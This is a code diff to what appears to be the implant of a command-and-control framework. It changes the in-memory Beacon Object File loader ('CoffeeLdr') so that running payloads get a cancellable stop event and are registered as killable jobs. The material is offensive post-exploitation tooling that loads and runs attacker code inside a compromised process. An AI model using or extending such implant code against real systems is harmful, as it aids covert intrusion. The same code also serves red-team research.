@@ -3,6 +3,7 @@
 #include <core/Win32.h>
 #include <core/MiniStd.h>
 #include <core/Package.h>
+#include <core/Jobs.h>
 #include <core/CoffeeLdr.h>
 #include <core/ObjectApi.h>
 #include <inject/InjectUtil.h>
@@ -397,7 +398,16 @@ VOID CoffeeCleanup( PCOFFEE Coffee )
     SIZE_T   Size     = 0;
     NTSTATUS NtStatus = 0;
 
-    if ( ! Coffee || ! Coffee->ImageBase )
+    if ( ! Coffee )
+        return;
+
+    if ( Coffee->StopEvent )
+    {
+        SysNtClose( Coffee->StopEvent );
+        Coffee->StopEvent = NULL;
+    }
+
+    if ( ! Coffee->ImageBase )
         return;
 
     if ( MmVirtualProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->ImageBase, Coffee->BofSize, PAGE_READWRITE ) )
@@ -669,7 +679,7 @@ VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
     PUTS( "Coffe entry was not found" )
 }
 
-VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
+VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID, HANDLE StopEvent )
 {
     PCOFFEE Coffee   = NULL;
     PVOID   NextBase = NULL;
@@ -697,6 +707,10 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
     Coffee->RequestID = RequestID;
     Coffee->Next      = Instance->Coffees;
     Instance->Coffees  = Coffee;
+
+    Coffee->StopEvent = StopEvent;
+    if ( ! Coffee->StopEvent )
+        SysNtCreateEvent( &Coffee->StopEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
 
 #if _WIN64
 
@@ -801,7 +815,7 @@ VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
     if ( ! Param->EntryName || ! Param->CoffeeData )
         goto ExitThread;
 
-    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize, Param->RequestID );
+    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize, Param->RequestID, Param->StopEvent );
 
 ExitThread:
     if ( Param )
@@ -822,6 +836,9 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
 {
     PCOFFEE_PARAMS CoffeeParams = NULL;
     INJECTION_CTX  InjectionCtx = { 0 };
+    HANDLE         hThread      = NULL;
+    HANDLE         StopEvent    = NULL;
+    DWORD          ThreadId     = 0;
 #if _WIN64
     BOOL           x64          = TRUE;
 #else
@@ -842,12 +859,31 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
     MemCopy( CoffeeParams->CoffeeData, CoffeeData, CoffeeDataSize );
     MemCopy( CoffeeParams->ArgData,    ArgData,    ArgSize        );
 
+    /* Create the stop event async BOFs (BeaconGetStopJobEvent) wait on.
+     * JobKill signals it so a long-running BOF can be cancelled. */
+    SysNtCreateEvent( &StopEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
+    CoffeeParams->StopEvent = StopEvent;
+
     InjectionCtx.Parameter = CoffeeParams;
 
-    Instance->Threads++;
+    hThread = ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, NtCurrentProcess(), x64, CoffeeRunnerThread, CoffeeParams, &ThreadId );
 
-    if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, NtCurrentProcess(), x64, CoffeeRunnerThread, CoffeeParams, NULL ) ) {
+    if ( ! hThread ) {
         PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
         PACKAGE_ERROR_WIN32
+
+        if ( StopEvent )
+            SysNtClose( StopEvent );
+
+        DATA_FREE( CoffeeParams->ArgData,    ArgSize        );
+        DATA_FREE( CoffeeParams->CoffeeData, CoffeeDataSize );
+        DATA_FREE( CoffeeParams->EntryName,  EntryNameSize  );
+        DATA_FREE( CoffeeParams,             sizeof( COFFEE_PARAMS ) );
+    } else {
+        Instance->Threads++;
+
+        /* Register the thread as a killable job; Data carries the stop event
+         * handle so JobKill can signal it before terminating the thread. */
+        JobAdd( RequestID, ThreadId, JOB_TYPE_THREAD, JOB_STATE_RUNNING, hThread, ( PVOID ) StopEvent );
     }
 }
